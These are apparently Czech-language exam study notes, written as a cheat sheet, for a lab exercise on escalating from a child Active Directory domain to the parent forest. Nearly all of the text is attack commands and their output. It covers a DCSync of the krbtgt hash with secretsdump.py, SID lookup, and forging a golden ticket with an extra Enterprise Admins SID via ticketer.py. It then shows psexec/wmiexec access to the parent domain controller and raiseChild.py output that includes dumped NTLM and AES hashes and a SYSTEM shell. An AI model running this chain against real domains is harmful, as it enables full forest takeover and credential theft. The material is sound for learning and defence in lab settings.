# Child → Parent Trust (Linux)

## Potřebuju získat

- KRBTGT hash Child Domain
- SID Child Domain
- FQDN Child Domain
- SID Enterprise Admins (Parent Domain)
- libovolné username (např. hacker)

---

## 1. DCSync KRBTGT

```
secretsdump.py logistics.inlanefreight.local/user@172.16.5.240 \
-just-dc-user LOGISTICS/krbtgt
```

Výstup:

```
krbtgt:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
```

---

## 2. Získání SID Child Domain

```
lookupsid.py logistics.inlanefreight.local/user@172.16.5.240
```

nebo

```
lookupsid.py logistics.inlanefreight.local/user@172.16.5.240 | grep SID
```

Výstup:

```
S-1-5-21-2806153819-209893948-922872689
```

---

## 3. Získání SID Enterprise Admins

RID Enterprise Admins je vždy:

```
519
```

Pokud znáš SID Parent Domain:

```
S-1-5-21-3842939050-3880317879-2865463114
```

pak:

```
Enterprise Admins SID

S-1-5-21-3842939050-3880317879-2865463114-519
```

---

## 4. Vytvoření Golden Ticketu

Na Linuxu se většinou používá Impacket:

```
ticketer.py \
-nthash <KRBTGT_HASH> \
-domain LOGISTICS.INLANEFREIGHT.LOCAL \
-domain-sid <CHILD_SID> \
-extra-sid <EA_SID> \
hacker
```

Vznikne:

```
hacker.ccache
```

---

## 5. Načtení ticketu

```
export KRB5CCNAME=hacker.ccache
```

Kontrola:

```
klist
```

---

## 6. Ověření Parent Domain

```
psexec.py -k -no-pass \
INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01
```

nebo

```
wmiexec.py -k -no-pass \
INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01
```

---

## 7. DCSync Parent Domain

```
secretsdump.py -k -no-pass \
INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01
```

Získáš:

- Domain Admin hashe
- KRBTGT Parent Domain

---
## Automatické Udělání ExtraSids attack


```
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-
student_adm
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file PaoxMcCP.exe
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service wJCT on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service wJCT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
---
# CPTS Rychlá logika

```
Child DA
 ↓
DCSync KRBTGT
 ↓
Child SID
 ↓
Enterprise Admins SID (-519)
 ↓
ticketer.py
 ↓
export KRB5CCNAME
 ↓
psexec.py -k -no-pass
 ↓
DCSync Parent
 ↓
Forest Owned
```